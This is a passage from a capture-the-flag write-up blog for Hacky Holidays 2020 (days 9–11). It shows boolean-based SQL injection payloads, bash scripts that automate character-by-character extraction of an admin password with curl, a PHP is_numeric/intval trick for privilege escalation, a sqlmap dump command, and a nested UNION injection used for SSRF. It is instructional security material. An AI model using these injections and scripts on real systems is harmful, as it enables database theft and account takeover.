data-src="/assets/img/posts/hackyholiday2020/day8/day-08-6.png" alt="IMAGE" /></p></ol><hr /><h1 id="day-09---evil-quiz">Day 09 - Evil Quiz</h1><p>In the Evil Quiz application, a user, after entring his name, can attempt a quiz, and based on his anwers, the application rates the user’s evilness on scale of 1 to 3.</p><p>The app also has Admin login panel.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day9/day-09-1.png" alt="IMAGE" /></p><h2 id="information-gathering-8">Information Gathering</h2><p>After spending some time using the application, these are some important information I got:</p><ul><li>The user has to follow the following workflow to complete the whole quiz process:<ul><li>Enter Name<li>Attempt Quiz<li>Get the results back on the <code class="language-plaintext highlighter-rouge">score</code> page</ul><li>The <code class="language-plaintext highlighter-rouge">Name</code> is shown on the score page.<li><code class="language-plaintext highlighter-rouge">Score</code> page also shows number of users that have same Name as mine!<li><p>After a little tinkering I found that even if I enter very random and gibberish Name, there is aways at least one more person having same Name.</p><p>That is interesting right?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day9/day-09-2.png" alt="IMAGE" /></p></ul><p>This gives a little idea that maybe we have to play with the Name parameter, as I did not found anything interesting/suspicious other than this behaviour.</p><ul><li>Then I entered the gibberish name like above, but added apostrophe <strong><code class="language-plaintext highlighter-rouge">'</code></strong>, this time the output showed that <strong>there are 0 players with same name is this one</strong>. To confirm the behaviour, I entered a common name like <code class="language-plaintext highlighter-rouge">admin</code> and added an apostrophe like <strong><code class="language-plaintext highlighter-rouge">admin'</code></strong>, the output was again that <strong>there are 0 players with same name is this one</strong>.<li>At this stage, trying for SQLi, I entered the following payload in Name field:<ul><li><strong><code class="language-plaintext highlighter-rouge">' AND false #</code></strong><ul><li>Output: There is 0 other player(s) with the same name as you!</ul><li><strong><code class="language-plaintext highlighter-rouge">' AND true #</code></strong><ul><li>Output: There is 1195799 other player(s) with the same name as you!</ul></ul></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day9/day-09-3.png" alt="IMAGE" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day9/day-09-4.png" alt="IMAGE" /></p><p>So at this point, we know that we have boolean based SQLi, the truthy statement return a very big number of players, while a false statement return 0 number of players! Having all above information, we can try payloads that are either true or false, this way we can get the information from the DB.</p><p>Our goal here is to retrieve information from DB, that enable us to login to admin panel, so maybe <code class="language-plaintext highlighter-rouge">username</code> &amp; <code class="language-plaintext highlighter-rouge">password</code> of admin user?</p><p>Lets abuse this vulnerability!</p><h2 id="hunting-the-flag-8">Hunting the flag</h2><ol><li><p>First thing I did was to check which tables exists in the DB, the first two table name that came to my mind were <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">users</code>. So I used following payload to check the length of 1st table:</p><p><code class="language-plaintext highlighter-rouge">' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 # </code></p><p>So first I am using a <strong>SELECT</strong> statement to get the first table from current DB, then using <strong>length</strong> function, I am checking if the length of table’s name is <strong>5</strong> (admin has length 5). The output on the <code class="language-plaintext highlighter-rouge">Score</code> page showed a large number of players, indicating the table name is indeed 5 characters long.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day9/day-09-5.png" alt="IMAGE" /></p><li><p>We got the length, but this does not mean the name is indeed <code class="language-plaintext highlighter-rouge">admin</code>, it only means that whatever the name of table is, it is 5 character long. So we need to check each character to see what the name of table is. For this, I used the following payload:</p><p><code class="language-plaintext highlighter-rouge">' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1,1))) = 97 # </code></p><p>First I am <strong>SELECT</strong>ing the first table of current DB, then using <strong>substr</strong> function, I am just selecting the first character of that table (note the <code class="language-plaintext highlighter-rouge">1,1</code>), in the end, I am converting that character to ascii (decimal form) and comparing if it is <code class="language-plaintext highlighter-rouge">=</code> to <code class="language-plaintext highlighter-rouge">97</code> (<code class="language-plaintext highlighter-rouge">97</code> in decimal means <code class="language-plaintext highlighter-rouge">a</code>). The output showed that indeed this statement is true, so first character (out of 5) of our table is <strong><code class="language-plaintext highlighter-rouge">a</code></strong>.</p><li><p>So in this way, we can now select the second character using <code class="language-plaintext highlighter-rouge">substr(QUERY-THAT-RETURNS-TABLENAME,CHAR-NUMBER,1)</code> function, convert it to ascii and compare with decimal numbers from <code class="language-plaintext highlighter-rouge">97 to 122</code> (a-z). And repeat this step for the remaining characters.</p><p><code class="language-plaintext highlighter-rouge">' AND (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,2,1))) = 100 #</code></p><p>(100 for <strong><code class="language-plaintext highlighter-rouge">"d"</code></strong>, output shows it is true as well) Following above steps, I found out the table name was indeed <code class="language-plaintext highlighter-rouge">admin</code>.</p><li>Now we have the table name, time to find out the column names. Here I did not really enumerated for the column names as I was quite sure that there will be <code class="language-plaintext highlighter-rouge">username</code> &amp; <code class="language-plaintext highlighter-rouge">password</code> columns here.<li><p>Just as we found the table name, I used same steps to find the length of actual values (first row) of culumn <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> =&gt; ' AND (length((select username from admin limit 0,1))) &gt; 5 #  //false
 =&gt; ' AND (length((select username from admin limit 0,1))) = 5 #  //true

 =&gt; ' AND (length((select password from admin limit 0,1))) &gt; 5 //true
 =&gt; ' AND (length((select password from admin limit 0,1))) &gt; 10 //true
 =&gt; ' AND (length((select password from admin limit 0,1))) &gt; 15 //true
 =&gt; ' AND (length((select password from admin limit 0,1))) &gt; 20 //false
 =&gt; ' AND (length((select password from admin limit 0,1))) = 17 //true
</pre></table></code></div></div><li><p>So we have username with length <strong><code class="language-plaintext highlighter-rouge">5</code></strong> and password with length <strong><code class="language-plaintext highlighter-rouge">17</code></strong>. We can use a script to automate the whole process and find the username and password. I made a script which does the job, just following the steps like step 2 to step 3. After completion, this script outputs the usernamen/password in decimal form so we need to convert it back to characters (decimal to string)</p><p><strong>Script that finds the username</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre> <span class="nv">userNameLength</span><span class="o">=</span>5<span class="p">;</span>
 <span class="nv">asciUser</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
 <span class="nv">asciCode</span><span class="o">=</span>97<span class="p">;</span>
 <span class="k">for</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;</span>i&lt;<span class="o">=</span><span class="nv">$userNameLength</span><span class="p">;</span>i++<span class="o">))</span><span class="p">;</span> <span class="k">do
     </span><span class="nb">echo</span> <span class="s2">"Checking char </span><span class="nv">$i</span><span class="s2"> aginst Ascii code:- "</span><span class="p">;</span>
     <span class="k">while</span> <span class="o">[</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">do
         </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$asciCode</span><span class="s2"> "</span><span class="p">;</span>
         <span class="nv">query</span><span class="o">=</span><span class="s2">"' AND (ascii(substr((select username from admin limit 0,1) ,</span><span class="nv">$i</span><span class="s2">,1))) = </span><span class="nv">$asciCode</span><span class="s2"> # "</span><span class="p">;</span>
         <span class="nv">cookie</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="s2">"https://hackyholidays.h1ctf.com/evil-quiz"</span> | <span class="nb">grep </span><span class="nv">session</span><span class="o">=</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="o">=</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="se">\;</span> <span class="nt">-f1</span><span class="si">)</span><span class="p">;</span>
         curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="s2">"POST"</span> <span class="nt">-b</span> <span class="s2">"session=</span><span class="nv">$cookie</span><span class="s2">"</span> <span class="nt">--data-binary</span> <span class="s2">"name=</span><span class="nv">$query</span><span class="s2">"</span> <span class="s2">"https://hackyholidays.h1ctf.com/evil-quiz"</span> <span class="o">&gt;</span> /dev/null
         <span class="nv">iscorrect</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-X</span> <span class="s2">"POST"</span> <span class="nt">-b</span> <span class="s2">"session=</span><span class="nv">$cookie</span><span class="s2">"</span> <span class="nt">--data-binary</span> <span class="s2">"ques_1=0&amp;ques_2=0&amp;ques_3=0"</span> <span class="s2">"https://hackyholidays.h1ctf.com/evil-quiz/start"</span> |  <span class="nb">grep</span> <span class="s2">"There is"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="se">\&gt;</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f3</span><span class="si">)</span><span class="p">;</span>
         <span class="k">if</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$iscorrect</span><span class="si">)</span> <span class="o">=</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
                
             <span class="o">((</span><span class="nv">asciCode</span><span class="o">=</span>asciCode+1<span class="o">))</span><span class="p">;</span>
             <span class="k">if</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$asciCode</span><span class="si">)</span> <span class="o">=</span> 123 <span class="o">]</span><span class="p">;</span> <span class="k">then
                 </span><span class="nb">break</span><span class="p">;</span>
             <span class="k">fi

         else
             </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">=&gt; POSITION </span><span class="nv">$i</span><span class="s2"> CHAR HAS ASCII CODE: </span><span class="nv">$asciCode</span><span class="s2">"</span><span class="p">;</span>
             asciUser+<span class="o">=</span><span class="nv">$asciCode</span><span class="p">;</span>
             asciUser+<span class="o">=</span><span class="s2">" "</span><span class="p">;</span>
             <span class="nv">asciCode</span><span class="o">=</span>97<span class="p">;</span>
             <span class="nb">break</span><span class="p">;</span>
         <span class="k">fi

     done
    

 done

 </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"++++ USERNAME IN DECIMAL IS: </span><span class="nv">$asciUser</span><span class="s2"> ++++"</span><span class="p">;</span>

</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day9/day-09-6.png" alt="IMAGE" /></p><p>Scripts says the username is: <strong>97 100 109 105 110</strong>, which is <strong><code class="language-plaintext highlighter-rouge">admin</code></strong>.</p><p>Similarly, Used quite similar script to find out the password. The password was <strong><code class="language-plaintext highlighter-rouge">S3creT_p4ssw0rd-$</code></strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre> <span class="nv">passwordLength</span><span class="o">=</span>17<span class="p">;</span>
 <span class="nv">asciPass</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
 <span class="nv">asciCode</span><span class="o">=</span>32<span class="p">;</span>
 <span class="k">for</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>1<span class="p">;</span>i&lt;<span class="o">=</span><span class="nv">$passwordLength</span><span class="p">;</span>i++<span class="o">))</span><span class="p">;</span> <span class="k">do
     </span><span class="nb">echo</span> <span class="s2">"Checking char </span><span class="nv">$i</span><span class="s2"> aginst Ascii code:- "</span><span class="p">;</span>
     <span class="k">while</span> <span class="o">[</span> 1 <span class="o">]</span><span class="p">;</span> <span class="k">do
         </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$asciCode</span><span class="s2"> "</span><span class="p">;</span>
         <span class="nv">query</span><span class="o">=</span><span class="s2">"' AND (ascii(substr((select password from admin limit 0,1) ,</span><span class="nv">$i</span><span class="s2">,1))) = </span><span class="nv">$asciCode</span><span class="s2"> # "</span><span class="p">;</span>
         <span class="nv">cookie</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="s2">"https://hackyholidays.h1ctf.com/evil-quiz"</span> | <span class="nb">grep </span><span class="nv">session</span><span class="o">=</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="o">=</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="se">\;</span> <span class="nt">-f1</span><span class="si">)</span><span class="p">;</span>
         curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="s2">"POST"</span> <span class="nt">-b</span> <span class="s2">"session=</span><span class="nv">$cookie</span><span class="s2">"</span> <span class="nt">--data-binary</span> <span class="s2">"name=</span><span class="nv">$query</span><span class="s2">"</span> <span class="s2">"https://hackyholidays.h1ctf.com/evil-quiz"</span> <span class="o">&gt;</span> /dev/null<span class="p">;</span>
         <span class="nv">iscorrect</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-X</span> <span class="s2">"POST"</span> <span class="nt">-b</span> <span class="s2">"session=</span><span class="nv">$cookie</span><span class="s2">"</span> <span class="nt">--data-binary</span> <span class="s2">"ques_1=0&amp;ques_2=0&amp;ques_3=0"</span> <span class="s2">"https://hackyholidays.h1ctf.com/evil-quiz/start"</span> |  <span class="nb">grep</span> <span class="s2">"There is"</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="se">\&gt;</span> <span class="nt">-f2</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f3</span><span class="si">)</span><span class="p">;</span>
         <span class="k">if</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$iscorrect</span><span class="si">)</span> <span class="o">=</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
                
             <span class="o">((</span><span class="nv">asciCode</span><span class="o">=</span>asciCode+1<span class="o">))</span><span class="p">;</span>
             <span class="k">if</span> <span class="o">[</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$asciCode</span><span class="si">)</span> <span class="o">=</span> 123 <span class="o">]</span><span class="p">;</span> <span class="k">then
                 </span><span class="nb">break</span><span class="p">;</span>
             <span class="k">fi

         else
             </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">=&gt; POSITION </span><span class="nv">$i</span><span class="s2"> CHAR HAS ASCII CODE: </span><span class="nv">$asciCode</span><span class="s2">"</span><span class="p">;</span>
             asciPass+<span class="o">=</span><span class="nv">$asciCode</span><span class="p">;</span>
             asciPass+<span class="o">=</span><span class="s2">" "</span><span class="p">;</span>
             <span class="nv">asciCode</span><span class="o">=</span>32<span class="p">;</span>
             <span class="nb">break</span><span class="p">;</span>
         <span class="k">fi

     done
        
 done

 </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"++++ PASSWORD IN DECIMAL IS: </span><span class="nv">$asciPass</span><span class="s2"> ++++"</span><span class="p">;</span>
</pre></table></code></div></div><li><p>Went to Admin login section, using the found username <code class="language-plaintext highlighter-rouge">admin</code> and password <code class="language-plaintext highlighter-rouge">S3creT_p4ssw0rd-$</code>, got the flag!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day9/day-09-7.png" alt="IMAGE" /></p></ol><hr /><h1 id="day-10---signup-manager">Day 10 - Signup Manager</h1><p>The main page had two functions, Login and Signup. After I created an account, I was just greeted with a message saying <code class="language-plaintext highlighter-rouge">We'll have a look into you and see if you're evil enough to join the grinch army!</code>.</p><h2 id="information-gathering-9">Information Gathering</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day10/day-10-1.png" alt="IMAGE" /></p><ul><li><p>Checking the source code revealed that there is an <code class="language-plaintext highlighter-rouge">README.md</code> file. I visited the url <code class="language-plaintext highlighter-rouge">https://hackyholidays.h1ctf.com/signup-manager/README.md</code>. The file got downloaded and it has some really sensitive information!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day10/day-10-2.png" alt="IMAGE" /></p><ul><li><p>The 2nd point suggests that there is a signupmanager.zip file in the directory, Which was true. Downloaded the file from the url <code class="language-plaintext highlighter-rouge">https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip</code>. it had the files namely <strong>index.php, user.php, admin.php,signup.php</strong>.</p><li><p>The 6th point tells us that in the <code class="language-plaintext highlighter-rouge">users.txt</code> file (where details of all users are stored), if we change the last character to <strong><code class="language-plaintext highlighter-rouge">Y</code></strong>, that specific users will become admin!</p></ul><li><p>After checking each file, only the <code class="language-plaintext highlighter-rouge">index.php</code> seems interesting. Reading the code revealed the information about how the new user is created and how the input values are handled.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day10/day-10-3.png" alt="IMAGE" /></p><li>The <code class="language-plaintext highlighter-rouge">addUser()</code> function takes the input values (from signup form), converts the<ul><li><strong>username,firstname and lastname</strong> values to 15 characters length (by padding the # char), if the user input size is less than 15.<li><strong>password &amp; radnom_hash</strong> variables to md5-hashes (this converts both to 32 characters each as md5 hash has length of 32).<li><p><strong>Age</strong> parameter into 3 characters length if the user input size is less than 3.</p><p>There is also a empty string and in the end of this whole concatenated string, a value <strong><code class="language-plaintext highlighter-rouge">"N"</code></strong> is concatenated. In the end, only the first 113 characters are added to users.txt file which contains all the user’s information.</p></ul><li>The <code class="language-plaintext highlighter-rouge">buildUser()</code> function reverse this whole <code class="language-plaintext highlighter-rouge">padding process</code>, and in the end checks if the last value i.e the <strong><code class="language-plaintext highlighter-rouge">113th</code></strong> character is <strong><code class="language-plaintext highlighter-rouge">"Y"</code></strong> or <strong><code class="language-plaintext highlighter-rouge">"N"</code></strong>. If it is <strong><code class="language-plaintext highlighter-rouge">"Y"</code></strong> then the user is admin otherwise not admin.</ul><p>Analyzing all the information we have, if we can send such an input which makes the 113th character to be <code class="language-plaintext highlighter-rouge">"Y"</code> instead of <code class="language-plaintext highlighter-rouge">"N"</code>, then our new created account will have admin privileges.</p><h2 id="hunting-the-flag-9">Hunting the flag</h2><ol><li><p>After spending a lots of time and testing each input to see if I could abuse any functionality, I could not find any. Exchanging ideas with a few participants helped quite a lot and I decided to focus more on the <code class="language-plaintext highlighter-rouge">age</code> parameter, as it was going through multiple functions.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day10/day-10-4.png" alt="IMAGE" /></p><li><p>So there were two checks, first to ensure that the input is numeric, and second to ensure that length of input is not more than 3. Also note that after all these checks, in the end the age value is casted to integer type using that <strong><code class="language-plaintext highlighter-rouge">intval()</code></strong> function.</p><ul><li>Doing a simple google search about the <code class="language-plaintext highlighter-rouge">is_numeric</code> function and checking the doumentaion page revealed something of interest!</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day10/day-10-5.png" alt="IMAGE" /></p><ul><li>Can you spot what could be more important for our scenario?<li><p>There is a value <strong><code class="language-plaintext highlighter-rouge">1337e0</code></strong> and documentaion says that it is numeric. Here <code class="language-plaintext highlighter-rouge">e</code> means exponent.</p><li>This function is not vulnerable itslef, but the way it is used in this context caused a logical vulnerability. I had to come up with such a value for <code class="language-plaintext highlighter-rouge">Age</code>, that itslef it is max 3 chars long, and it is numeric in type too, but once converted to integer, its length increases.</ul><li><p>Entering an exponential value here causes the real issue like <code class="language-plaintext highlighter-rouge">1e3</code> (which is 1000 in integer form). The <code class="language-plaintext highlighter-rouge">intval()</code> in the end converts the <code class="language-plaintext highlighter-rouge">1e3</code> into <code class="language-plaintext highlighter-rouge">1000</code> thus bypassing the above checks and uploading a value greater than 3 chars!.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day10/day-10-6.png" alt="IMAGE" /></p><li><p>So now we can control the total lenght of that string which is generated in the <code class="language-plaintext highlighter-rouge">addUser()</code> function. All we have to do is to send the age value of length <code class="language-plaintext highlighter-rouge">4</code> and for the last input field i.e <code class="language-plaintext highlighter-rouge">lastname</code>, its <code class="language-plaintext highlighter-rouge">15th</code> char must be <strong><code class="language-plaintext highlighter-rouge">Y</code></strong>. This way, when the <code class="language-plaintext highlighter-rouge">addUser()</code> function adds the value <strong><code class="language-plaintext highlighter-rouge">N</code></strong> in the last, it will be <strong><code class="language-plaintext highlighter-rouge">114th</code></strong> char and the <strong><code class="language-plaintext highlighter-rouge">Y</code></strong> will be at <strong><code class="language-plaintext highlighter-rouge">113</code></strong> position!</p><p>I used the following values:</p><ul><li>username=<code class="language-plaintext highlighter-rouge">197IQ</code>, password=<code class="language-plaintext highlighter-rouge">maga2020!</code>, age=<code class="language-plaintext highlighter-rouge">1e3</code>,firstname=<code class="language-plaintext highlighter-rouge">Elite</code>, lastname=<code class="language-plaintext highlighter-rouge">HaxorWith197IQY</code><li>Not the <code class="language-plaintext highlighter-rouge">Y</code> as the 15th char (last char) in lastname field.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day10/day-10-7.png" alt="IMAGE" /></p></ol><p>Upon this,the new user is actually an Admin now and we can access the flag!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day10/day-10-8.png" alt="IMAGE" /></p><hr /><h1 id="day-11">Day 11</h1><h2 id="information-gathering-10">Information Gathering</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-1.png" alt="IMAGE" /></p><p>After checking the application, i got the following important endpoints:</p><ul><li>/attack-box/login<li>/album?hash=6-CHAR-HASH<li>/picture?data=BASE64-ENCODED-DATA<li>/api</ul><p>The <code class="language-plaintext highlighter-rouge">/attack-box/login</code> is simple login form, nothing else.</p><p>The <code class="language-plaintext highlighter-rouge">/album?hash=</code> endpoint takes 6 character string (a hash maybe) and displays the content it contains.</p><p>The images url was quite interesting as they were fetched from <code class="language-plaintext highlighter-rouge">/picture?data=</code> endpoint, where tha values for <strong>data</strong> parameter were <code class="language-plaintext highlighter-rouge">base64</code> encoded. I decoded the value and the value was in the form of : <code class="language-plaintext highlighter-rouge">{"image":"r3c0n_server_4fdk59\/uploads\/HASH.jpg", "auth":"HASH"}</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-3.png" alt="IMAGE" /></p><p>So the <code class="language-plaintext highlighter-rouge">"image"</code> object contains the path to resource (in this case the image) &amp; <code class="language-plaintext highlighter-rouge">"auth"</code> object contains the hash for that specific image that is generated by the server somehow.</p><p>The <code class="language-plaintext highlighter-rouge">/api</code> endpoint showed meaning of the status code it returns and also a message saying the api is being developed right now.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-2.png" alt="IMAGE" /></p><p>Visiting any endpoint after <code class="language-plaintext highlighter-rouge">/api/</code>, like <code class="language-plaintext highlighter-rouge">/api/user</code> returns the following response: <code class="language-plaintext highlighter-rouge">{"error":"This endpoint cannot be visited from this IP address"}</code></p><p>This indicates that there must be another way of accessing these endpoints.</p><p>Coming back to the <code class="language-plaintext highlighter-rouge">/picture?data=</code> endpoint, I noted that for each different picture, the <strong>auth</strong> value is different and if we try to change/replace the auth/image with another image’s data, or we change even the path from <strong>uploads</strong> to something else, we get the message <code class="language-plaintext highlighter-rouge">invalid authentication hash</code> in response. So what this mean is that, for every image or path (like <code class="language-plaintext highlighter-rouge">/uploads</code>), a different <strong>auth</strong> hash is generated and they are bind together.</p><p>After this information gathering phase, we have some valuable information:</p><ul><li>We can’t directly visit <code class="language-plaintext highlighter-rouge">/api/ANYTHING</code> endpoint, so there must be another way around, probably <strong>SSRF</strong>!<li>This potential <strong>SSRF</strong> can be achieved if we can make the <strong>image</strong> object (from that base64 encoded data for <code class="language-plaintext highlighter-rouge">/picture?data=</code> endpoint) to access the <code class="language-plaintext highlighter-rouge">/api</code> endpoint.<li>But to achieve this, we will have to generate a valid <strong>auth</strong> hash for any endpoint, that we want the <strong>image</strong> object to access.<li>So we need to find a way to generate the <strong>auth</strong> hash for a successful <strong>SSRF</strong></ul><p>So trying to find the way to generate the hash … wait! Did I say hash?</p><p>We have not talked about the <code class="language-plaintext highlighter-rouge">/album?hash=</code> endpoint. Well as I said earlier, I was collaborating with two amazing hackers. One of them really helped in this challenge. He was able to find that the <strong>hash</strong> parameter is vulnerable to boolean-based sql injection.</p><p>So now lets see the steps to do all the above mentioned tasks to solve this challenge.</p><h2 id="hunting-the-flag-10">Hunting the flag</h2><ol><li>Running sqlmap against the <code class="language-plaintext highlighter-rouge">/album?hash=</code> endpoint shows that this is actually boolean-based sql injectable.<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> python3 sqlmap.py <span class="nt">-u</span> https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash<span class="o">=</span>jdh34k <span class="nt">--dump</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-4.png" alt="IMAGE" /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day11/day-11-5.png" alt="IMAGE" /></p><li>This shows that we have three columns namely <strong>id</strong>, <strong>hash</strong> &amp; <strong>name</strong> for the <code class="language-plaintext highlighter-rouge">album</code> table. So the first column (<strong>id</strong>) is responsible for loading the pictures from <code class="language-plaintext highlighter-rouge">picture</code> table.<li>Here if we can manipulate the column <code class="language-plaintext highlighter-rouge">photo</code> of table <code class="language-plaintext highlighter-rouge">photo</code> and change it to the path like <code class="language-plaintext highlighter-rouge">/api/user</code> then the server will also generate the <code class="language-plaintext highlighter-rouge">auth</code> hash for that particulat endpoint/path.<li>Considering this in mine, To select columns of <code class="language-plaintext highlighter-rouge">photo</code> table we can use double UNION query.<li><p>Here is the final request that I used to generate the hashes for custom paths:</p><p><code class="language-plaintext highlighter-rouge">%27UNION%20SELECT%20"%27UNION%20SELECT%20NULL,NULL,%27../api/user%27%23",null,null%23</code></p><p>Lets break down this query:</p><ul><li>First <code class="language-plaintext highlighter-rouge">SELECT</code> is being used to select the 3 culumns of <code class="language-plaintext highlighter-rouge">album</code> table which are <strong>id, hash, name</strong>.<li>In the first column (<strong>id</strong>) I am using another <code class="language-plaintext highlighter-rouge">SELECT</code> to select the 3 columns of <code class="language-plaintext highlighter-rouge">photo</code> table which are <strong>id, album_id, photo</strong>.<li>Our concern is only with the <code class="language-plaintext highlighter-rouge">photo</code> column as its values are being used in our <code class="language-plaintext highlighter-rouge">image</code> object (remember the base64 encoded payload that we decoded!). So what we want here is to change the value of the <code class="language-plaintext highlighter-rouge">photo</code> column to the path where we want to send the request (basically the request will be made by server itself as we will use this value in the <code class="language-plaintext highlighter-rouge">image</code> object … SSRF!)<li>So to achieve this in the second <code class="language-plaintext highlighter-rouge">SELECT</code> statement, I used NULL for first two columns, and then the path we want to send the request to, in this case it was <code class="language-plaintext highlighter-rouge">/api/ANY-ENDPOINT</code><li>The server will generate a valid <code class="language-plaintext highlighter-rouge">auth</code> hash for us automagically.</ul><li><p>After sending the above sql payload in <code class="language-plaintext highlighter-rouge">?hash=</code> parameter, we get an image in response that 